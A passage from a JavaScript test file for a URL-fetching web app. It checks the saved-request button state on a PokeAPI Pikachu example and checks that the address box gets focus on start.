    app.state.url = app.state.dataUrl = 'https://pokeapi.co/api/v2/pokemon/pikachu';
    app.state.data = PIKACHU;
    app.applySpec(app.normalizeSpec(app.buildFallbackSpec(PIKACHU, app.state.url)), 'fallback');
    app.setUrlInput(app.state.url);
    expect(app.dom.saveBtn.textContent.trim()).toBe('Save');
    app.saveCurrentRequest();
    expect(app.getSavedRequests()[0].name).toBe('Pikachu');
    expect(app.dom.saveBtn.classList.contains('is-saved')).toBe(true);
    expect(app.dom.saveBtn.getAttribute('aria-pressed')).toBe('true');
    expect(app.dom.saveBtn.textContent.trim()).toBe('Saved');
    app.setUrlInput('https://other.test/');
    expect(app.dom.saveBtn.textContent.trim()).toBe('Save');
  });
});

describe('Get started', () => {
  // It opened the app without putting the cursor in the URL box whenever a
  // page had been restored from last time.
  it('puts the cursor in the address box even over a restored page', async () => {
    const app = await boot({ url: 'https://imago.test/' });
    app.state.data = { a: 1 };
    app.dom.landingStart.click();
    expect(app.window.document.activeElement).toBe(app.dom.urlInput);
  });
});
